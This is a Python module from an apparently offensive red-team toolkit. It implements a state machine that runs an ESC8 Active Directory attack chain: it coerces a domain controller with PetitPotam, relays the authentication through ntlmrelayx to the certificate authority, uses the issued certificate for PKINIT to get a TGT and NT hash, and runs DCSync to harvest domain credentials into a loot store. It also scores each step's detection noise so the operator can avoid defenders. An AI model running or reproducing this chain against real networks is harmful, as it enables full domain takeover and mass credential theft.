"""Coerce chain — multi-step, multi-host attack orchestration.

fieldkit's charter piece: recce stops at the trigger, fieldkit executes
past it. A coerce chain is what "past the trigger" actually means when
the target is Active Directory — an operator forces a target host to
authenticate outbound, relays that auth to a second service to obtain a
credential or certificate, then walks the credential into ACLs, tickets,
and DA.

This module is the state machine that walks a chain. It has NO opinion
about which primitives run at each step — those live in :mod:`fieldkit.coerce`
(D2), :mod:`fieldkit.relay` (D3), and the post-relay actions in
:mod:`fieldkit.adcs` / :mod:`fieldkit.kerberos` (D4). The chain module
composes them.

Design shape
------------

  * :class:`Step` — an atomic move: reachability probe, coerce trigger,
    relay listener start/stop, cert-request post-action, DCSync. Each
    Step names its *kind* (``preflight`` / ``target-side`` / ``attacker-side``),
    carries a numeric *detection_cost* (D6 wires this into scoring),
    and exposes a callable ``action(chain, ctx) -> Outcome``.

  * :class:`Outcome` — the result of running a Step. ``kind`` is one of:
    ``ok`` (proceed), ``skip`` (this branch doesn't apply, try the
    fallback profile), ``fail`` (the chain aborts at this step),
    ``manual`` (fieldkit prepared the step but the operator must fire
    it — used when the listener can't bind locally and the fallback is
    "here's the ntlmrelayx command you run").

  * :class:`Chain` — a named recipe (``esc8`` / ``rbcd`` / ``smb-relay-exec``)
    of ordered Steps, plus the runtime state (which step is current, per-
    step outcomes, any accumulated evidence — a cert, a TGT, a hash).

  * :func:`register` / :func:`profile` — a module-scoped registry so
    tests + operators can list available profiles by name. New profiles
    (D5) plug in by decorating a factory function.

D1 landing surface
------------------

Only the state machine + one primitive (reachability preflight) are real
in D1. Every subsequent step in the shipped esc8 profile returns
``Outcome(kind="manual", …)`` with a placeholder message pointing at the
subsequent slice's ETA. The whole flow is walkable end-to-end so the
CLI ``fieldkit chain run esc8 <target>`` produces a full trail against a
mock target — proves the shape without pretending the primitives work
yet.
"""
import os
from dataclasses import dataclass, field
from typing import Callable, Optional

from .state import utcnow


#: Allowed :attr:`Outcome.kind` values. See the module docstring for the
#: semantics fieldkit assigns to each.
OUTCOME_KINDS = frozenset({"ok", "skip", "fail", "manual"})

#: Allowed :attr:`Step.kind` values. The kind gates where the step's
#: side effect actually lands: ``preflight`` never touches the target
#: network (socket probes only); ``target-side`` runs on the foothold
#: (or against the target directly); ``attacker-side`` runs on the
#: fieldkit machine itself (listener, decrypt, subprocess).
STEP_KINDS = frozenset({"preflight", "target-side", "attacker-side"})


@dataclass(frozen=True)
class Step:
    """One atomic move in a coerce chain.

    ``action`` receives ``(chain, ctx)`` and returns an :class:`Outcome`.
    ``ctx`` is opaque here — every profile hands its own context object
    (Store, target IP, credential, arsenal paths). The chain module never
    inspects ``ctx`` — it just threads it through.

    ``detection_cost`` is a 0-10 integer estimating the noise this step
    generates on a mature SOC's timeline. D6 aggregates these into a
    chain-total score surfaced in the report; D1 stores them without
    doing anything with them yet.
    """
    name: str
    kind: str
    action: Callable
    detection_cost: int = 0

    def __post_init__(self):
        if self.kind not in STEP_KINDS:
            raise ValueError(f"Step.kind must be one of {sorted(STEP_KINDS)}, got {self.kind!r}")
        if not (0 <= self.detection_cost <= 10):
            raise ValueError(
                f"Step.detection_cost must be 0-10, got {self.detection_cost}")


@dataclass(frozen=True)
class Outcome:
    """The result of running one :class:`Step`.

    * ``kind == "ok"`` — proceed to the next step.
    * ``kind == "skip"`` — this branch doesn't apply on this target; the
      profile may declare a fallback or the chain aborts. D1 treats
      ``skip`` as terminal (no fallback logic yet — lands in D4/D5).
    * ``kind == "fail"`` — the step ran but hit a hard error; the chain
      aborts and the trail records the reason.
    * ``kind == "manual"`` — fieldkit prepared the step but the operator
      must fire it (listener can't bind locally, elevated coerce needs
      a domain admin cred not in Store, etc.). D1 treats ``manual`` as
      an advance so the walk completes; the operator picks up from the
      trail.

    ``data`` is the step's produced state (a cert bytes blob, a TGT, a
    recovered hash). The chain accumulates ``data`` dicts into
    ``Chain.artifacts`` so downstream steps can consume upstream output.
    """
    kind: str
    evidence: str
    data: dict = field(default_factory=dict)

    def __post_init__(self):
        if self.kind not in OUTCOME_KINDS:
            raise ValueError(
                f"Outcome.kind must be one of {sorted(OUTCOME_KINDS)}, got {self.kind!r}")


@dataclass
class Chain:
    """A named recipe + the state as it walks the steps.

    :attr:`profile` names the recipe (``esc8`` / ``rbcd`` / …).
    :attr:`target` is the primary target — the DC for esc8, the
    workstation being pivoted onto for rbcd, the auth-relay endpoint
    for smb-relay-exec.
    :attr:`steps` is the ordered tuple of :class:`Step` objects.

    :attr:`current` is the index into ``steps`` of the NEXT step to
    run. :attr:`outcomes` is the trail — one Outcome per step actually
    executed. :attr:`artifacts` accumulates every step's ``Outcome.data``,
    so a downstream step can read ``chain.artifacts["cert"]`` even though
    the cert was produced two steps back.

    :attr:`status` is derived from the walk state:
      * ``"planned"`` — no steps run yet;
      * ``"in_progress"`` — some steps ran, more to go;
      * ``"proven"`` — every step ran, last outcome was ``ok`` (or
        ``manual`` — the operator has to finish the manual step, but
        the chain's plan is complete);
      * ``"aborted"`` — a step returned ``fail`` or ``skip`` and no
        fallback profile picked up.
    """
    profile: str
    target: str
    steps: tuple
    current: int = 0
    outcomes: list = field(default_factory=list)
    artifacts: dict = field(default_factory=dict)
    aborted_reason: Optional[str] = None
    started_at: Optional[str] = None
    finished_at: Optional[str] = None

    @property
    def status(self):
        if not self.outcomes:
            return "planned"
        if self.aborted_reason:
            return "aborted"
        if self.current >= len(self.steps):
            return "proven"
        return "in_progress"

    @property
    def total_detection_cost(self):
        """Sum of detection_cost across every step actually walked
        (skipped/failed steps count once — the cost lands as soon as
        the step runs). D6 uses this as the primary chain score."""
        walked = self.steps[:len(self.outcomes)]
        return sum(s.detection_cost for s in walked)


# ---------------------------------------------------------------- profile registry

#: name → factory(**kwargs) -> Chain. Populated by :func:`register`.
_PROFILES = {}


def register(name):
    """Decorator: register a chain factory under ``name``. The factory
    signature is per-profile; the registry just stores the callable.

    Example::

        @register("esc8")
        def esc8_chain(target_dc, relay_target=None):
            return Chain(profile="esc8", target=target_dc, steps=(...))
    """
    def _r(factory):
        if name in _PROFILES:
            raise ValueError(f"chain profile {name!r} already registered")
        _PROFILES[name] = factory
        return factory
    return _r


def profile(name):
    """Look up a registered profile factory; raises KeyError if absent."""
    if name not in _PROFILES:
        raise KeyError(
            f"unknown chain profile {name!r}; registered: {sorted(_PROFILES)}")
    return _PROFILES[name]


def known_profiles():
    """Sorted list of every registered profile name — feeds the CLI's
    argparse choices + the report renderer."""
    return sorted(_PROFILES)


# ---------------------------------------------------------------- walker

def walk(chain, ctx, on_step=None):
    """Run every remaining step of ``chain``, in order. Returns the
    chain object mutated in-place (caller reads ``chain.status`` +
    ``chain.outcomes`` for the result).

    Halts at the first step returning ``fail`` or ``skip`` (D1 has no
    fallback logic — D5 adds profile-chaining). ``manual`` outcomes DO
    NOT halt; the walker advances so the whole plan is walkable and
    the trail records what the operator needs to finish.

    ``on_step(chain, step, outcome)`` (optional) is called after each
    step for CLI progress rendering.
    """
    if chain.started_at is None:
        chain.started_at = utcnow()
    while chain.current < len(chain.steps):
        step = chain.steps[chain.current]
        try:
            outcome = step.action(chain, ctx)
        except Exception as exc:                              # noqa: BLE001
            outcome = Outcome(
                kind="fail",
                evidence=f"{type(exc).__name__}: {exc}")
        if not isinstance(outcome, Outcome):
            outcome = Outcome(kind="fail",
                              evidence=f"step returned {type(outcome).__name__}, "
                                       "expected Outcome")
        chain.outcomes.append(outcome)
        if outcome.data:
            chain.artifacts.update(outcome.data)
        if on_step:
            on_step(chain, step, outcome)
        if outcome.kind in ("fail", "skip"):
            chain.aborted_reason = f"step {step.name!r} returned {outcome.kind}: {outcome.evidence}"
            chain.finished_at = utcnow()
            return chain
        chain.current += 1
    chain.finished_at = utcnow()
    return chain


# ---------------------------------------------------------------- reachability preflight

def _reach_probe(chain, ctx):
    """Preflight: is the chain's target reachable from the fieldkit host?

    D1 uses a bare TCP probe (SMB port 445 by default; profiles can
    override via ``ctx.probe_port``). No auth attempt, no protocol
    handshake — just a connect() with a short timeout so an unreachable
    target aborts the chain before firing anything louder.
    """
    import socket
    target = chain.target
    port = getattr(ctx, "probe_port", 445)
    timeout = getattr(ctx, "probe_timeout", 3.0)
    try:
        with socket.create_connection((target, port), timeout=timeout):
            pass
    except OSError as exc:
        return Outcome(
            kind="fail",
            evidence=f"tcp connect {target}:{port} failed: {exc}",
            data={"probe": {"target": target, "port": port, "ok": False}})
    return Outcome(
        kind="ok",
        evidence=f"tcp {target}:{port} reachable",
        data={"probe": {"target": target, "port": port, "ok": True}})


REACHABILITY_STEP = Step(
    name="preflight:reachability",
    kind="preflight",
    action=_reach_probe,
    detection_cost=0)


def _stub_action(msg):
    """Factory that returns a Step action which always yields ``manual``
    with the given message. Used for the D1 esc8 profile — the whole
    plan is walkable, but the non-preflight steps hand off to the
    operator until their landing slice ships (D2 through D4)."""
    def _action(chain, ctx):
        _ = chain, ctx
        return Outcome(kind="manual", evidence=msg)
    return _action


# ---------------------------------------------------------------- post-relay steps

def _cert_request_action(chain, ctx):
    """Validate the certificate captured by relay:capture: sanity-check
    it exists, has bytes, matches the expected principal.

    ADCS actually issued the cert during relay:capture (that's what
    the --adcs / --template ntlmrelayx flags do — they auto-request
    on the caught auth), so this step is verification, not another
    HTTP round-trip.
    """
    import base64
    _ = ctx
    cert_bytes = chain.artifacts.get("cert_bytes", "")
    principal = chain.artifacts.get("cert_principal", "")
    if not cert_bytes:
        return Outcome(
            kind="fail",
            evidence="no cert_bytes in chain artifacts — relay:capture didn't acquire a cert")
    if not principal:
        return Outcome(
            kind="fail",
            evidence="no cert_principal in chain artifacts — cannot proceed with PKINIT")
    try:
        raw = base64.b64decode(cert_bytes, validate=True)
    except Exception as exc:                                    # noqa: BLE001
        return Outcome(
            kind="fail",
            evidence=f"cert_bytes did not decode as base64: {exc}")
    if len(raw) < 100:
        return Outcome(
            kind="fail",
            evidence=f"cert bytes suspiciously small ({len(raw)}B) — likely bad relay capture")
    return Outcome(
        kind="ok",
        evidence=f"cert for {principal} validated ({len(raw)}B PFX)",
        data={"cert_pfx_len": len(raw)})


def _pkinit_action(chain, ctx):
    """Materialize the captured cert to disk, present it to the KDC
    via certipy-ad `auth`, land a TGT ccache + (if UnPAC-able) the
    machine account's NT hash.
    """
    import base64
    import tempfile
    from . import pkinit
    cert_bytes = chain.artifacts.get("cert_bytes", "")
    principal = chain.artifacts.get("cert_principal", "")
    domain = getattr(ctx, "domain", None)
    if not domain:
        return Outcome(
            kind="manual",
            evidence="no domain on ctx — pass --domain <AD-DOMAIN> to run PKINIT")
    if not cert_bytes or not principal:
        return Outcome(
            kind="fail",
            evidence="cert artifacts missing — post:cert-request must have failed")
    fd, pfx_path = tempfile.mkstemp(prefix="fk-pkinit-", suffix=".pfx")
    with os.fdopen(fd, "wb") as fh:
        fh.write(base64.b64decode(cert_bytes))
    result = pkinit.auth(
        principal=principal,
        pfx_path=pfx_path,
        domain=domain,
        dc_ip=chain.target,
        tool_bin=getattr(ctx, "pkinit_tool_bin", None),
        tool_timeout=getattr(ctx, "pkinit_timeout", 30))
    if result.kind == "no-tool":
        return Outcome(
            kind="manual",
            evidence=(f"certipy-ad not on PATH; PFX at {pfx_path}\n"
                      f"  run: {result.command_hint}"))
    if result.kind == "unreachable":
        return Outcome(kind="fail",
                        evidence=f"PKINIT to {chain.target} unreachable",
                        data={"pkinit_detail": result.detail})
    if result.kind == "kdc-reject":
        return Outcome(kind="fail",
                        evidence=(f"KDC rejected PKINIT — cert may be for a "
                                  f"different account (subject: {principal})"),
                        data={"pkinit_detail": result.detail[-512:]})
    if result.kind == "cert-invalid":
        return Outcome(kind="fail",
                        evidence="cert failed to load / decrypt into certipy",
                        data={"pkinit_detail": result.detail[-512:]})
    if result.kind != "ok":
        return Outcome(kind="fail",
                        evidence=f"PKINIT ended in unrecognized state ({result.kind})",
                        data={"pkinit_detail": result.detail[-512:]})
    store = getattr(ctx, "store", None)
    if store is not None:
        try:
            host_row = store.host_by_ip(chain.target)
            hid = host_row["id"] if host_row else None
        except Exception:                                       # noqa: BLE001
            hid = None
        if result.ccache_path:
            store.add_loot(host_id=hid, kind="ccache",
                            value=principal, path=result.ccache_path)
        if result.nt_hash:
            store.add_loot(host_id=hid, kind="nthash",
                            value=f"{principal}:{result.nt_hash}")
    evidence = f"TGT obtained for {principal}"
    if result.ccache_path:
        evidence += f" → {result.ccache_path}"
    if result.nt_hash:
        evidence += " (NT hash extracted)"
    return Outcome(
        kind="ok", evidence=evidence,
        data={"ccache_path": result.ccache_path,
              "pkinit_principal": principal,
              "pkinit_nt_hash": result.nt_hash})


def _dcsync_action(chain, ctx):
    """DCSync via nxc using either the PKINIT ccache OR the extracted
    NT hash. Recovered credentials land in Store when ctx.store is set."""
    from . import dcsync as dcsync_mod
    from . import creds as creds_mod
    ccache = chain.artifacts.get("ccache_path", "")
    nt_hash = chain.artifacts.get("pkinit_nt_hash", "")
    principal = chain.artifacts.get("pkinit_principal", "")
    domain = getattr(ctx, "domain", None)
    if not ccache and not (nt_hash and principal and domain):
        return Outcome(
            kind="fail",
            evidence=("dcsync needs ccache or (nt_hash + principal + domain) "
                      "— pkinit step must have failed"))
    if ccache:
        result = dcsync_mod.dcsync(
            dc_ip=chain.target,
            ccache_path=ccache,
            tool_bin=getattr(ctx, "dcsync_tool_bin", None),
            tool_timeout=getattr(ctx, "dcsync_timeout", 180))
    else:
        user = principal.split("/", 1)[-1] if "/" in principal else principal
        result = dcsync_mod.dcsync(
            dc_ip=chain.target,
            nt_hash=nt_hash, username=user, domain=domain,
            tool_bin=getattr(ctx, "dcsync_tool_bin", None),
            tool_timeout=getattr(ctx, "dcsync_timeout", 180))
    if result.kind == "no-tool":
        return Outcome(kind="manual",
                        evidence=f"nxc/netexec not on PATH; run:\n  {result.command_hint}")
    if result.kind == "denied":
        return Outcome(
            kind="fail",
            evidence="DRSGetNCChanges denied — machine account may lack DS-Replication rights",
            data={"dcsync_detail": result.detail[-512:]})
    if result.kind == "unreachable":
        return Outcome(kind="fail",
                        evidence=f"dcsync target {chain.target} unreachable",
                        data={"dcsync_detail": result.detail[-512:]})
    if result.kind != "ok":
        return Outcome(kind="fail",
                        evidence=f"dcsync ended in unrecognized state ({result.kind})",
                        data={"dcsync_detail": result.detail[-512:]})
    store = getattr(ctx, "store", None)
    persisted = 0
    if store is not None:
        for c in result.credentials:
            # c.principal is either "DOMAIN\user" (nxc) or bare user.
            # c.nt_hash is "LM:NT" (impacket format) — split so we
            # pass the NT portion to parse_credential's nt_hash kwarg.
            nt_only = c.nt_hash.split(":")[-1]
            try:
                parsed = creds_mod.parse_credential(
                    c.principal, nt_hash=nt_only)
                store.add_credential(parsed.credential,
                                     source=f"dcsync:{chain.target}")
                persisted += 1
            except Exception:                                   # noqa: BLE001
                pass
    return Outcome(
        kind="ok",
        evidence=(f"DCSync ok — {len(result.credentials)} account(s) recovered"
                  + (f", {persisted} persisted" if store is not None else "")),
        data={"dcsync_count": len(result.credentials),
              "dcsync_persisted": persisted})


# ---------------------------------------------------------------- relay steps

def _relay_listen_action(chain, ctx):
    """Spawn the ntlmrelayx listener with the profile's relay target.

    Reads from ``ctx``:
      * ``ctx.listener_ip`` (required) — the IP the coerce target will
        auth to. Usually the operator's Kali reachable from the
        target subnet.
      * ``ctx.ca_endpoint`` (esc8) — the CA host (for adcs-cert mode);
        without it, the step reports manual since ntlmrelayx has
        nowhere to relay the caught auth.
      * ``ctx.template`` (optional) — ADCS template name; default
        ``DomainController`` per the esc8 canonical.
      * ``ctx.relay_port_smb`` / ``ctx.relay_port_http`` (optional) —
        bind ports; defaults 445 / 80. Non-root operators want to
        pass 4445 / 8080.
      * ``ctx.relay_tool_bin`` (optional) — override the resolved
        ntlmrelayx binary path (test hook).
      * ``ctx.relay_bind_wait`` (optional) — how long to wait for a
        bind-ok signature before giving up; default 3.0s.

    On success the step registers the live :class:`~fieldkit.relay.Listener`
    into ``ctx._relay_listener`` (private-ish attribute the
    :func:`_relay_capture_action` step reads) AND updates
    ``ctx.listener_uri`` so the coerce step (which ran BEFORE this in
    the chain plan? — no, relay:listen runs before coerce for esc8;
    see the profile step order) has a real URI to point at.

    Wait — that's a note-to-future-self: the esc8 step order is
    reachability → coerce → relay:listen → relay:capture. So the
    coerce step in D2 needs the listener URI BEFORE relay:listen
    runs. Solution used here: ``_petitpotam_action`` calls
    :func:`fieldkit.relay.start` inline the first time it needs a
    listener_uri, stashes the Listener on ctx, and the later
    relay:listen step becomes a no-op if the listener is already
    running. See _ensure_listener().
    """
    listener = _ensure_listener(chain, ctx)
    if isinstance(listener, Outcome):
        return listener
    if not listener.listener_uri:
        return Outcome(
            kind="fail",
            evidence=("relay listener could not bind — check --relay-port-smb "
                      "/ --relay-port-http (default 445/80 need root)"),
            data={"relay_bind_lines": listener.captured_lines[-10:]})
    return Outcome(
        kind="ok",
        evidence=f"relay listener up at {listener.listener_uri} "
                 f"(pid {listener.proc.pid if listener.proc else '?'})",
        data={"relay_listener_uri": listener.listener_uri,
              "relay_pid": listener.proc.pid if listener.proc else None})


def _relay_capture_action(chain, ctx):
    """Wait for the listener to catch a relay outcome (cert / cred /
    fail / timeout), stop the listener, and — if we got a
    certificate — persist it into Store.

    Reads:
      * ``ctx._relay_listener`` — the Listener spawned by
        :func:`_relay_listen_action` / :func:`_ensure_listener`.
      * ``ctx.relay_wait_capture`` (optional) — how long to wait for
        the caught auth to arrive after the coerce fired; default
        60s. Real coerces usually fire within seconds; a generous
        default absorbs a slow SMB timeout.
      * ``ctx.store`` (optional) — a fieldkit.state.Store; if set,
        a cert-ok outcome persists a certificate row linked to the
        chain via chain_id.
    """
    from . import relay as relay_mod
    listener = getattr(ctx, "_relay_listener", None)
    if listener is None:
        return Outcome(
            kind="fail",
            evidence="no relay listener attached to ctx — did relay:listen run?")
    timeout = getattr(ctx, "relay_wait_capture", 60.0)
    outcome = relay_mod.wait_capture(listener, timeout=timeout)
    listener.stop()

    if outcome.kind == "cert-ok":
        store = getattr(ctx, "store", None)
        cert_id = None
        chain_id = getattr(chain, "_persisted_id", None)   # set by CLI post-walk
        if store is not None and outcome.cert_bytes:
            cert_id = store.add_certificate(
                principal=outcome.principal or chain.target,
                cert_b64=outcome.cert_bytes,
                source="relay-adcs",
                template=listener.target.template,
                chain_id=chain_id)
        return Outcome(
            kind="ok",
            evidence=f"cert acquired for {outcome.principal or chain.target}"
                     + (f" (cert #{cert_id})" if cert_id else ""),
            data={"cert_id": cert_id,
                  "cert_principal": outcome.principal,
                  "cert_bytes": outcome.cert_bytes})
    if outcome.kind == "cred-ok":
        return Outcome(
            kind="ok",
            evidence=f"credential caught for {outcome.principal or '?'}",
            data={"relay_principal": outcome.principal})
    if outcome.kind == "cred-fail":
        return Outcome(
            kind="fail",
            evidence="relay caught an auth but it failed (STATUS_LOGON_FAILURE / ACCESS_DENIED)",
            data={"relay_detail": outcome.detail})
    if outcome.kind == "timeout":
        return Outcome(
            kind="fail",
            evidence=f"relay listener saw no auth in {timeout}s — coerce may have missed",
            data={"relay_detail": outcome.detail})
    if outcome.kind == "no-tool":
        return Outcome(
            kind="manual",
            evidence="ntlmrelayx not on PATH — run listener + coerce by hand "
                     "(install `impacket-scripts` package)")
    return Outcome(
        kind="fail",
        evidence=f"relay ended in unrecognized state ({outcome.kind})",
        data={"relay_detail": outcome.detail})


def _ensure_listener(chain, ctx):
    """Spawn the relay listener if it isn't already running; stash it
    on ctx and update ctx.listener_uri. Returns the Listener on
    success, or an Outcome on failure the caller re-raises.

    Called from BOTH _petitpotam_action (needs listener_uri) and
    _relay_listen_action (idempotent no-op if already spawned) so the
    chain step order stays flexible.
    """
    from . import relay as relay_mod
    listener = getattr(ctx, "_relay_listener", None)
    if listener is not None and listener.running:
        return listener
    listener_ip = getattr(ctx, "listener_ip", None)
    if not listener_ip:
        return Outcome(
            kind="manual",
            evidence=("no listener_ip on ctx — run "
                      "`fieldkit chain run esc8 <dc> --listener-ip <fieldkit-ip> "
                      "--ca <ca-host>` to enable the relay listener"))
    ca_endpoint = getattr(ctx, "ca_endpoint", None)
    if not ca_endpoint:
        return Outcome(
            kind="manual",
            evidence=("no ca_endpoint on ctx — pass --ca <ca-host> for the "
                      "esc8 ADCS relay target"))
    target = relay_mod.RelayTarget(
        mode="adcs-cert",
        target=ca_endpoint,
        template=getattr(ctx, "template", "DomainController"))
    listener = relay_mod.start(
        target=target,
        listener_ip=listener_ip,
        port_smb=getattr(ctx, "relay_port_smb", 445),
        port_http=getattr(ctx, "relay_port_http", 80),
        bind_addr=getattr(ctx, "relay_bind_addr", "0.0.0.0"),
        tool_bin=getattr(ctx, "relay_tool_bin", None),
        bind_wait=getattr(ctx, "relay_bind_wait", 3.0))
    ctx._relay_listener = listener       # noqa: SLF001 — ctx is per-run
    if listener.listener_uri:
        ctx.listener_uri = listener.listener_uri
    return listener


def _petitpotam_action(chain, ctx):
    """The D2 landing: fire the PetitPotam MS-EFSR coerce and map the
    :class:`~fieldkit.coerce.CoerceResult` kind to a chain Outcome.

    Reads from ``ctx``:
      * ``ctx.listener_uri``  (required) — SMB path the target will
        auth to. Set to a placeholder that reaches the relay listener
        D3 stands up; None → manual outcome ("listener not configured").
      * ``ctx.cred`` (optional) — dict {domain, username, password} for
        auth to the MS-EFSR endpoint. Modern DCs require it.
      * ``ctx.petitpotam_tool_bin`` (optional) — override the tool path
        the primitive auto-detects. Test hook + operator override.
      * ``ctx.petitpotam_timeout`` (optional) — subprocess timeout.
    """
    from .coerce import petitpotam
    listener_uri = getattr(ctx, "listener_uri", None)
    if not listener_uri:
        # D3: try to spawn the relay listener now — coerce runs before
        # relay:listen in the plan, but the coerce needs a listener_uri
        # to point at, so the primitive owns the spawn if the operator
        # supplied enough to build one.
        listener = _ensure_listener(chain, ctx)
        if isinstance(listener, Outcome):
            return listener       # manual/fail bubbling from _ensure_listener
        listener_uri = listener.listener_uri
        if not listener_uri:
            return Outcome(
                kind="fail",
                evidence="relay listener could not bind — cannot proceed with coerce",
                data={"relay_bind_lines": listener.captured_lines[-10:]})
    result = petitpotam.fire(
        target=chain.target,
        listener_uri=listener_uri,
        cred=getattr(ctx, "cred", None),
        tool_bin=getattr(ctx, "petitpotam_tool_bin", None),
        tool_timeout=getattr(ctx, "petitpotam_timeout", 15))
    # Map coerce kind → chain outcome kind.
    #   ok         → ok         (proceed to relay step)
    #   patched    → skip       (this DC is patched; profile aborts;
    #                            D4/D5 will introduce PrinterBug fallback)
    #   unreachable → fail      (chain can't recover)
    #   auth-error → fail       (bad or missing cred)
    #   no-tool    → manual     (prepare-only playbook: operator runs
    #                            the command_hint themselves)
    #   fail       → fail
    kind_map = {"ok": "ok", "patched": "skip", "unreachable": "fail",
                "auth-error": "fail", "no-tool": "manual", "fail": "fail"}
    outcome_kind = kind_map[result.kind]
    # For the no-tool path, tack the command hint onto the evidence
    # so `fieldkit chain show` renders it inline.
    evidence = result.evidence
    if result.kind == "no-tool" and result.command_hint:
        evidence = f"{evidence}\n  run: {result.command_hint}"
    return Outcome(
        kind=outcome_kind,
        evidence=evidence,
        data={"petitpotam": {
            "listener_uri": listener_uri,
            "result_kind": result.kind,
            "detail": result.detail,
        }})


# ---------------------------------------------------------------- esc8 profile

@register("esc8")
def esc8_chain(target_dc, ca_endpoint=None, cred=None):
    """The canonical fieldkit coerce chain: coerce a DC → HTTP-relay
    to the enterprise CA → obtain a certificate for the DC account →
    PKINIT → DCSync.

    D1 lands the shape with reachability as the only live primitive;
    every subsequent step is a manual-outcome stub with an inline
    ETA pointing at its landing slice (D2 → petitpotam, D3 → relay
    server, D4 → post-relay actions).
    """
    _ = ca_endpoint, cred        # will be threaded into steps in D3/D4
    return Chain(
        profile="esc8",
        target=target_dc,
        steps=(
            REACHABILITY_STEP,
            Step("coerce:petitpotam",
                 "target-side",
                 _petitpotam_action,
                 detection_cost=3),
            Step("relay:listen",
                 "attacker-side",
                 _relay_listen_action,
                 detection_cost=1),
            Step("relay:capture",
                 "attacker-side",
                 _relay_capture_action,
                 detection_cost=2),
            Step("post:cert-request",
                 "attacker-side",
                 _cert_request_action,
                 detection_cost=1),
            Step("post:pkinit-tgt",
                 "attacker-side",
                 _pkinit_action,
                 detection_cost=0),
            Step("post:dcsync",
                 "attacker-side",
                 _dcsync_action,
                 detection_cost=3),
        ))
